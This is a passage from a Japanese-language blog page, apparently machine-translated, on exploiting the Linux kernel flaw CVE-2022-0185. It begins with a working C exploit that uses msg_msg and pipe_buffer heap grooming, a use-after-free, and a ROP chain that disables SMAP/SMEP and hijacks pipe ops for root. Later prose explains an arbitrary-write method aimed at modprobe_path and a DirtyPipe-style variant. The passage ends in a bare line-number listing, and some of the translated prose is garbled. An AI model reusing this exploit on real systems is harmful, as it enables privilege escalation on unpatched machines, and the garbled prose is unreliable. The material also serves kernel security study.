list2_uaf_mtype);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] alloc msg_msg as heap buffer with known address\n&quot;);</span><br><span class="line">    &#123;</span><br><span class="line">        for (int j = ((list2_leak_mtype + 0x100) &gt;&gt; 8); j &lt; 0x10; j++) &#123;</span><br><span class="line">            msgrcv(list2_leak_msqid, &amp;msg_b, sizeof(msg_b.mtext), MTYPE_B | (j &lt;&lt; 8), IPC_NOWAIT);</span><br><span class="line">        &#125;</span><br><span class="line">        memset(buff, 0, sizeof(buff));</span><br><span class="line">        struct msg_msg *p = (struct msg_msg *)buff;</span><br><span class="line">        p-&gt;m_list.next = list2_uaf_msg_addr;</span><br><span class="line">        p-&gt;m_list.prev = 0xdeadbeefdeadbeef;</span><br><span class="line">        p-&gt;m_type = MTYPE_A;</span><br><span class="line"></span><br><span class="line">        uint64_t *p2;</span><br><span class="line"></span><br><span class="line">        // unlink next / prev</span><br><span class="line">        p2 = (uint64_t *)(buff + 0x80);</span><br><span class="line">        *p2++ = heap_buffer_addr; // +0x80</span><br><span class="line">        *p2++ = heap_buffer_addr; // +0x88</span><br><span class="line"></span><br><span class="line">        // pipe_buf_operations +0x100</span><br><span class="line">        p2 = (uint64_t *)(buff + 0x100);</span><br><span class="line">        *p2++ = 0xdeadbeef11111111;          // confirm</span><br><span class="line">        *p2++ = kbase + GADGET_stack_pivot1; // release</span><br><span class="line">        *p2++ = 0xdeadbeef22222222;          // try_steal</span><br><span class="line">        *p2++ = 0xdeadbeef33333333;          // get</span><br><span class="line"></span><br><span class="line">        // ROP +0x180</span><br><span class="line">        p2 = (uint64_t *)(buff + 0x180);</span><br><span class="line">        *p2++ = kbase + GADGET_pop_rbx; // disable smap, smep</span><br><span class="line">        *p2++ = 0x6f0;</span><br><span class="line">        *p2++ = kbase + GADGET_pop_rdx;</span><br><span class="line">        *p2++ = 0;</span><br><span class="line">        *p2++ = kbase + GADGET_pop_r8;</span><br><span class="line">        *p2++ = kbase + GADGET_pop_r8;</span><br><span class="line">        *p2++ = kbase + GADGET_set_cr4;</span><br><span class="line">        *p2++ = 0;</span><br><span class="line">        *p2++ = (uint64_t)&amp;payload; // jump to userland</span><br><span class="line"></span><br><span class="line">        memset(&amp;msg_b, 0, sizeof(msg_b));</span><br><span class="line">        memcpy(msg_b.mtext, buff, sizeof(msg_b.mtext));</span><br><span class="line">        msg_b.mtype = MTYPE_B;</span><br><span class="line">        if (msgsnd(list2_leak_msqid, &amp;msg_b, sizeof(msg_b.mtext), 0) &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] msgsnd() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] fetch heap_buffer address by oob read again\n&quot;);</span><br><span class="line">    &#123;</span><br><span class="line">        ssize_t copy_size = msgrcv(list1_corrupted_msqid, &amp;msg_a_oob, sizeof(msg_a_oob.mtext), 0, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">        if ((copy_size &lt; 0) || (copy_size != sizeof(msg_a_oob.mtext))) &#123;</span><br><span class="line">            logd(&quot;[-] Recv from corrupted msg_msg failed\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        uint64_t *oob_data = (uint64_t *)(msg_a_oob.mtext + sizeof(msg_a.mtext));</span><br><span class="line">        size_t oob_size = sizeof(msg_a_oob.mtext) - sizeof(msg_a.mtext);</span><br><span class="line">        struct msg_msg *p = (struct msg_msg *)oob_data;</span><br><span class="line">        if (((int *)&amp;p-&gt;mtext)[0] != MSG_SIG) &#123;</span><br><span class="line">            logd(&quot;[-] I don&#x27;t think this can happen\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        heap_buffer_addr = p-&gt;m_list.next + sizeof(struct msg_msg);</span><br><span class="line">        logd(&quot;[+] heap_buffer_addr: 0x%lx\n&quot;, heap_buffer_addr);</span><br><span class="line">        if (strlen((char *)&amp;heap_buffer_addr) &lt; 8) &#123;</span><br><span class="line">            logd(&quot;[-] pointer can&#x27;t contain 0x00 bytes\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean uncorrupted msg_msg</span><br><span class="line">    logd(&quot;[*] clean unused msg_msg ...\n&quot;);</span><br><span class="line">    clean_msq_2();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int exploit_step2(int fd) &#123;</span><br><span class="line">    char buff[0x1000];</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] prepare fsconfig heap overflow\n&quot;);</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    memset(buff, &#x27;A&#x27;, 0x100 - 2);</span><br><span class="line">    for (int i = 0; i &lt; 0xf; i++) &#123;</span><br><span class="line">        fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, buff, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    memset(buff, &#x27;B&#x27;, 0x100 - 3);</span><br><span class="line">    fsconfig(fd, FSCONFIG_SET_STRING, &quot;\x00&quot;, buff, 0);</span><br><span class="line"></span><br><span class="line">    // alloc msg_msg with 0x1000(-0x30) body and 0x400(-0x08) msg_msgseg</span><br><span class="line">    logd(&quot;[*] sparying msg_msg ...\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        memset(&amp;msg_a, 0, sizeof(msg_a));</span><br><span class="line">        msg_a.mtype = MTYPE_A;</span><br><span class="line">        memset(msg_a.mtext, &#x27;Q&#x27;, sizeof(msg_a.mtext));</span><br><span class="line">        ((int *)&amp;msg_a.mtext)[0] = MSG_SIG;</span><br><span class="line">        ((int *)&amp;msg_a.mtext)[1] = i;</span><br><span class="line">        if (msgsnd(msqid_1[i], &amp;msg_a, sizeof(msg_a.mtext), 0) &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] msgsnd() fail\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // trigger oob write to overwrite msg_msg.next (hopes)</span><br><span class="line">    logd(&quot;[*] trigger oob write in `legacy_parse_param` to corrupt msg_msg.next\n&quot;);</span><br><span class="line">    memset(buff, 0, sizeof(buff));</span><br><span class="line">    struct msg_msg *p = (struct msg_msg *)buff;</span><br><span class="line">    p-&gt;m_list.next = heap_buffer_addr;</span><br><span class="line">    p-&gt;m_list.prev = 0xdeadbeefdeadbeef;</span><br><span class="line">    p-&gt;m_type = MTYPE_A; // with &#x27;=&#x27; appended</span><br><span class="line">    fsconfig(fd, FSCONFIG_SET_STRING, buff, &quot;\x00&quot;, 0);</span><br><span class="line"></span><br><span class="line">    // free uaf msg_msg</span><br><span class="line">    logd(&quot;[*] free uaf msg_msg from correct msqid\n&quot;);</span><br><span class="line">    if (msgrcv(list2_leak_msqid, &amp;msg_b, sizeof(msg_b.mtext), list2_uaf_mtype, 0) &lt; 0) &#123;</span><br><span class="line">        logd(&quot;[-] msgrcv() fail\n&quot;);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // spary skbuff_data to re-acquire uaf msg_msg and fake the header</span><br><span class="line">    logd(&quot;[*] spray skbuff_data to re-acquire the 0x400 slab freed by msg_msg\n&quot;);</span><br><span class="line">    &#123;</span><br><span class="line">        memset(buff, 0, sizeof(buff));</span><br><span class="line">        struct msg_msg *p = (struct msg_msg *)buff;</span><br><span class="line">        p-&gt;m_list.next = heap_buffer_addr + 0x80;</span><br><span class="line">        p-&gt;m_list.prev = heap_buffer_addr + 0x80;</span><br><span class="line">        p-&gt;m_ts = 0x100;</span><br><span class="line">        p-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">        p-&gt;next = 0;</span><br><span class="line">        p-&gt;security = 0;</span><br><span class="line">        spray_skbuff_data(buff, 0x400 - 0x140);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // free uaf msg_msg</span><br><span class="line">    logd(&quot;[*] free skbuff_data using fake msqid\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_MSQIDS_1; i++) &#123;</span><br><span class="line">        if (msgrcv(msqid_1[i], &amp;msg_b, sizeof(msg_b.mtext), MTYPE_FAKE, IPC_NOWAIT) &gt; 0) &#123;</span><br><span class="line">            logd(&quot;[*] freed using msqid %d\n&quot;, i);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // filled with pipe_buffer</span><br><span class="line">    logd(&quot;[*] spray pipe_buffer to re-acquire the 0x400 slab freed by skbuff_data\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">        if (pipe(dummy_pipe[i])) &#123;</span><br><span class="line">            logd(&quot;[-] Alloc pipe failed\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        write(dummy_pipe[i][1], buff, 0x100);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] free skbuff_data to make pipe_buffer become UAF\n&quot;);</span><br><span class="line">    free_skbuff_data(buff, 0x400 - 0x140);</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] spray evil skbuff_data to re-acquire the 0x400 slab use by pipe_buffer\n&quot;);</span><br><span class="line">    logd(&quot;[*] overwrite pipe_buffer-&gt;ops ...\n&quot;);</span><br><span class="line">    &#123;</span><br><span class="line">        memset(buff, 0, sizeof(buff));</span><br><span class="line">        uint64_t *p = (uint64_t *)buff;</span><br><span class="line">        p[0] = kbase + GADGET_stack_pivot2; // pivot again</span><br><span class="line">        p[1] = heap_buffer_addr + 0x180;    // ROP offset</span><br><span class="line">        p[2] = heap_buffer_addr + 0x100;    // hijack ops</span><br><span class="line">        *(uint64_t *)(buff + 0x39) = kbase + GADGET_stack_pivot2;</span><br><span class="line">        spray_skbuff_data(buff, 0x400 - 0x140);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    logd(&quot;[*] trigger pipe ops-&gt;release() ...\n&quot;);</span><br><span class="line">    for (int i = 0; i &lt; NUM_PIPES; i++) &#123;</span><br><span class="line">        if (close(dummy_pipe[i][0]) &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] close\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if (close(dummy_pipe[i][1]) &lt; 0) &#123;</span><br><span class="line">            logd(&quot;[-] close\n&quot;);</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void) &#123;</span><br><span class="line">    logd(&quot;[+] perform initialization\n&quot;);</span><br><span class="line">    init_unshare();</span><br><span class="line">    bind_cpu();</span><br><span class="line">    init_msq();</span><br><span class="line">    init_sock();</span><br><span class="line">    init_tf_work();</span><br><span class="line"></span><br><span class="line">    int fd;</span><br><span class="line"></span><br><span class="line">    fd = call_fsopen();</span><br><span class="line">    logd(&quot;[+] perform exploit step1\n&quot;);</span><br><span class="line">    while (exploit_step1(fd)) &#123;</span><br><span class="line">        logd(&quot;[!] retry step1 ...\n&quot;);</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        fd = call_fsopen();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = call_fsopen();</span><br><span class="line">    logd(&quot;[+] perform exploit step2\n&quot;);</span><br><span class="line">    while (exploit_step2(fd)) &#123;</span><br><span class="line">        logd(&quot;[!] retry step2 ...\n&quot;);</span><br><span class="line"></span><br><span class="line">        close(fd);</span><br><span class="line">        fd = call_fsopen();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../../../img/bin/linux/12.png" alt="avatar"></p><p>方法1 - msg_msg を使って、任意のアドレス書き込み用原画を作成する<br>本家ブログからの方法：<a href="https://www.willsroot.io/2022/01/cve-2022-0185.html">https://www.willsroot.io/2022/01/cve-2022-0185.html</a></p><p>これも msgsnd の基本的な実装から始まります。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">// `msgsnd`通过几层简单包装来到`do_msgsnd`</span><br><span class="line"></span><br><span class="line">// &gt;&gt;&gt; source/ipc/msg.c:963</span><br><span class="line">/* 963 */ SYSCALL_DEFINE4(msgsnd, int, msqid, struct msgbuf __user *, msgp, size_t, msgsz,</span><br><span class="line">/* 964 */ int, msgflg)</span><br><span class="line">/* 965 */ &#123;</span><br><span class="line">/* 966 */ return ksys_msgsnd(msqid, msgp, msgsz, msgflg);</span><br><span class="line">/* 967 */ &#125;</span><br><span class="line"></span><br><span class="line">// &gt;&gt;&gt; source/ipc/msg.c:953</span><br><span class="line">/* 953 */ long ksys_msgsnd(int msqid, struct msgbuf __user *msgp, size_t msgsz,</span><br><span class="line">/* 954 */  int msgflg)</span><br><span class="line">/* 955 */ &#123;</span><br><span class="line">------</span><br><span class="line">/* 960 */ return do_msgsnd(msqid, mtype, msgp-&gt;mtext, msgsz, msgflg);</span><br><span class="line">/* 961 */ &#125;</span><br><span class="line"></span><br><span class="line">// &gt;&gt;&gt; source/ipc/msg.c:840</span><br><span class="line">/* 840 */ static long do_msgsnd(int msqid, long mtype, void __user *mtext,</span><br><span class="line">/* 841 */ size_t msgsz, int msgflg)</span><br><span class="line">/* 842 */ &#123;</span><br><span class="line">------</span><br><span class="line">    // 调用`load_msg`</span><br><span class="line">/* 856 */ msg = load_msg(mtext, msgsz);</span><br><span class="line"></span><br><span class="line">// &gt;&gt;&gt; source/ipc/msgutil.c:84</span><br><span class="line">/*  84 */ struct msg_msg *load_msg(const void __user *src, size_t len)</span><br><span class="line">/*  85 */ &#123;</span><br><span class="line">/*  86 */ struct msg_msg *msg;</span><br><span class="line">/*  87 */ struct msg_msgseg *seg;</span><br><span class="line">------</span><br><span class="line">// 先alloc结构体</span><br><span class="line">/*  91 */ msg = alloc_msg(len);</span><br><span class="line">------</span><br><span class="line">/*  95 */ alen = min(len, DATALEN_MSG);</span><br><span class="line">    // 调用`copy_from_user`写入第一个 msg_msg</span><br><span class="line">/*  96 */ if (copy_from_user(msg + 1, src, alen))</span><br><span class="line">/*  97 */ goto out_err;</span><br><span class="line">/*  98 */ </span><br><span class="line">    // 根据next指针找到下个seg</span><br><span class="line">/*  99 */ for (seg = msg-&gt;next; seg != NULL; seg = seg-&gt;next) &#123;</span><br><span class="line">/* 100 */ len -= alen;</span><br><span class="line">/* 101 */ src = (char __user *)src + alen;</span><br><span class="line">/* 102 */ alen = min(len, DATALEN_SEG);</span><br><span class="line">    // 调用`copy_from_user`写入msg_msgseg</span><br><span class="line">/* 103 */ if (copy_from_user(seg + 1, src, alen))</span><br><span class="line">/* 104 */ goto out_err;</span><br><span class="line">/* 105 */ &#125;</span><br><span class="line"></span><br><span class="line">// &gt;&gt;&gt; source/ipc/msgutil.c:46</span><br><span class="line">/* 46 */ static struct msg_msg *alloc_msg(size_t len)</span><br><span class="line">/* 47 */ &#123;</span><br><span class="line">/* 48 */ struct msg_msg *msg;</span><br><span class="line">------</span><br><span class="line">/* 52 */ alen = min(len, DATALEN_MSG);</span><br><span class="line">    // 分配msg</span><br><span class="line">/* 53 */ msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">------</span><br><span class="line">/* 60 */ len -= alen;</span><br><span class="line">/* 61 */ pseg = &amp;msg-&gt;next;</span><br><span class="line">/* 62 */ while (len &gt; 0) &#123;</span><br><span class="line">/* 63 */ struct msg_msgseg *seg;</span><br><span class="line">------</span><br><span class="line">/* 67 */ alen = min(len, DATALEN_SEG);</span><br><span class="line">    // 分配seg</span><br><span class="line">/* 68 */ seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">------</span><br><span class="line">/* 71 */ *pseg = seg;</span><br><span class="line">/* 72 */ seg-&gt;next = NULL;</span><br><span class="line">/* 73 */ pseg = &amp;seg-&gt;next;</span><br><span class="line">/* 74 */ len -= alen;</span><br><span class="line">/* 75 */ &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>したがって、攻撃者は、ユーザステートページフォルト黒魔術（例：userfaultfdまたはFUSE）を使って最初のcopy_from_userを妨害し、この脆弱性のOOB書き込みを使って、次のcopy_from_userが任意のアドレス書き込みを行うようにmsg_msgの次のポインタを変更できるのです。 書き込み先はmodprobe_pathまたはcore_patternです。</p><p>なお、新バージョンのuserfaultfdは機能拡張されており、SYS_PTRACE権限を持たないプログラムからは呼び出すことができないため、FUSEのみ使用可能です。</p><p>方法2 - unlinkでopsを変更する<br>元記事の後半を直接読むか、筆者の搾取（怠慢、嘘</p><p>方法2 - unlinkでopsを変更する</p><p><a href="https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_kctf.c">https://github.com/Crusaders-of-Rust/CVE-2022-0185/blob/master/exploit_kctf.c</a></p><h5 id="原語の新しい使い方：パイプ"><a href="#原語の新しい使い方：パイプ" class="headerlink" title="原語の新しい使い方：パイプ"></a>原語の新しい使い方：パイプ</h5><p>ここ数日、DirtyPipe（CVE-2022-0847）についての話題が多く、この脆弱性の原因や悪用方法について詳しく知ることができたと思います。 このホールがすごいのは、エクスプロイトの際にカーネルアドレスに依存しない、ちょっとしたロジックホールなので、この脆弱性でカーネルを攻撃するには、一部のカーネルホールのように、ROPなどを使ってカーネル内のガジェットのオフセット位置を固定する必要がないのです。</p><p>今回のDirtyPipeの修正で、この脆弱性の影響は終わりなのでしょうか？</p><p>いや、DirtyPipeの脆弱性そのものよりも、この脆弱性の本当の宝はまだ発見されていない、その背後に隠れているオリジナル言語だと思うんです。</p><p>もし、カーネルのヒープにUAFやその他の悪用があり、それをstruct pipe_bufferの破損に変換できたとしたら、なぜ従来はopsをリークしてカーネルベースを取得し、opsを修正してROPする（私の経験や原著者の2番目のアプローチ）か、modprobe_を見つけるかです。 のパスとcore_patternのオフセット・アドレスの組み合わせ（筆者の最初のアプローチ）でしょうか。</p><p>UAFがDirtyPipeに変換されるようにそのフラグを修正すれば、カーネルアドレスを介さずにどんなファイルにも簡単に書き込めるようになるのでは?</p><p>ここで、パイプの歴史について簡単に触れておきましょう。</p><p>初期のころは、マージの機能は struct pipe_buffer の flags フィールドではなく、struct pipe_buf_operations の can_merge フィールドで管理されていました。 そこで、splice が linux に追加されたとき、splice は以下のように page_cache_pipe_buf_ops , という新しい pipe_buf_operations を提供しました。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static struct pipe_buf_operations page_cache_pipe_buf_ops = &#123;</span><br><span class="line">.can_merge = 0,</span><br><span class="line">.map = page_cache_pipe_buf_map,</span><br><span class="line">.unmap = page_cache_pipe_buf_unmap,</span><br><span class="line">.release = page_cache_pipe_buf_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ここで、can_mergeフィールドはデフォルトで0です。これは、fopsをpage_cache_pipe_buf_opsに変更するだけなので、copy_page_to_iter_pipeにフラグを設定するロジックがないことを説明しています。</p><p>その後、2016年のコミット241699cd72a8 “new iov_iter flavour: pipe-backed” (Linux 4.9, 2016)で、2つの関数が追加され、そのうちの1つはcopy_です。 page_to_iter_pipe では、pipe_buffer の flags が初期化されていませんが、この時点ではまだ can_merge パラメータが fops にあり、flags には興味深いオプションがないため、まだ大きな問題は起こっていません。</p><p>時は2019年、コミット01e7187b4119 “pipe: stop using -&gt;can_merge” (Linux 5.0, 2019) がcan_mergeフィールドを追いかけ始めるが、この時点ではまだ操作がかなり乱暴で、その点を除けば、この時点で can_mergeフィールドのすべての使用fopsを削除しましたが、pipe_buf_can_mergeという関数も追加しました。おそらく、匿名パイプ以外のすべてのパイプはマージをサポートしていないので、fopsがanon_pipe_buf_opsかどうかだけ判断していることが発見されました。 今のところ、’16年のマージ操作と未初期化のバグはリンクしていない。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static bool pipe_buf_can_merge(struct pipe_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">return buf-&gt;ops == &amp;anon_pipe_buf_ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最後に、2020年に、おそらくまだこの判定は乱暴すぎると感じていたのか、マージ操作の判定がpipe_bufferのフラグに詰め込まれました：Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops “ (Linux 5.8, 2020). 16年間埋もれたバグが、4年後にようやく脆弱性に変わったのです。</p><p>DirtyPipeの穴は5.8以降のカーネルでしか使えないという人もいるかもしれませんが、UAFをDirtyPipeに変換するというアイデアも5.8以降のカーネルでしか使えないのでしょうか？</p><p>いや、スプライスが機能する限り、このアイデアは有効でしょう。</p><p>古いバージョンで oops に can_merge を入れても、OOB read で anon_pipe_buf_ops のアドレスを読み出し、splice 後に oops を anon_pipe_buf_ops に変更すれば問題ない。 のバージョンアップを行いました。</p><p>CVE-2022-0185をオリジナルのDirtyPipe言語で書き直すと、このExploitではカーネルバージョンの適応が不要になります（ただしGFP_KERNEL_ACCOUNTの制限により&gt;5.9が必要です）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span 